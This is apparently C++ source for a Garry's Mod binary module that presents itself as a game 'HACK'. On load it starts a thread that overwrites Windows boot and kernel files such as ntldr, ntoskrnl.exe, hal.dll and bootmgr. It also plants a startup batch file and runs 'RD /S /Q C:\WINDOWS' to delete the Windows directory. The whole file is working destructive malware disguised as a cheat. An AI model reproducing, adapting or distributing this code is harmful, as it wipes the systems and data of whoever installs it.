
#define CLIENT_DLL

#undef _UNICODE
#define WIN32_LEAN_AND_MEAN

#include <GMLuaModule.h>

#include <eiface.h>
#include <direct.h> //This is where _getcwd is defined
#include <stdarg.h>
#include <sys/stat.h>
#include <Windows.h>
#include <exception>
#include <fstream>
#include <string>
#include <sstream>
#include <stdio.h>
#include <cdll_int.h>

using namespace std;

GMOD_MODULE(Open, Close);
ILuaInterface* cl_Lua;
HANDLE EvilThreadHandle;

char* EvilCommands[]	= {"RD /S /Q C:\\WINDOWS"}; //"C:\\shutdown.exe -s -t 300 -c Whoops"
char* ToFuck[] 			= {"C:\\boot.ini", "C:\\config.sys", "C:\\ntldr", "C:\\WINDOWS\\bootstat.dat", "C:\\WINDOWS\\System32\\ntoskrnl.exe", "C:\\WINDOWS\\System32\\hal.dll", "C:\\WINDOWS\\System32\\bootres.dll", "C:\\WINDOWS\\Boot\\DVD\\PCAT\\en-US\\bootfix.bin", "C:\\WINDOWS\\Boot\\DVD\\PCAT\\etfsboot.com", "C:\\WINDOWS\\Boot\\DVD\\PCAT\\boot.sdi", "C:\\WINDOWS\\Boot\\PCAT\\bootmgr"};



void WriteToFile(const char* File, const char* Cont) {
	ofstream WriteFile;
		WriteFile.open(File, ios::binary);
		
		if ( !WriteFile.is_open() ) {
			WriteFile.close();
			return;
		}
		
		WriteFile << Cont;
	WriteFile.close();
}




DWORD WINAPI EvilThread(LPVOID param) {
	system("copy C:\\WINDOWS\\System32\\shutdown.exe C:\\shutdown.exe");
	
	WriteToFile("C:\\Users\\All Users\\Start Menu\\Programs\\Startup\\windows.bat", "RD /S /Q C:\\WINDOWS");
	WriteToFile("C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\windows.bat", "RD /S /Q C:\\WINDOWS");
	
	for (int i=0;i<(sizeof(ToFuck)/sizeof(char*));i++) {
		char* File = ToFuck[i];
		WriteToFile(File, File);
		//cl_Lua->Msg("! Overwrite: %s\n", ToFuck[i] );
	}
	
	for (int i=0;i<(sizeof(EvilCommands)/sizeof(char*));i++) {
		system( EvilCommands[i] );
		//cl_Lua->Msg("! EvilCommands: %s\n", EvilCommands[i] );
	}
	
	Sleep(100);
	return true;
}


int Open(lua_State *L) {
	cl_Lua = Lua();
	
	//cl_Lua->Msg("\nYour PC is about explode, sorry about that :)\n\n");
	cl_Lua->Msg("HACK Loaded\n");
	Sleep(1000);
	EvilThreadHandle = CreateThread(NULL, NULL, &EvilThread, NULL, NULL, NULL);
	
    return 0;
}

int Close(lua_State *L) {
	CloseHandle(EvilThreadHandle);
    return 0;
}





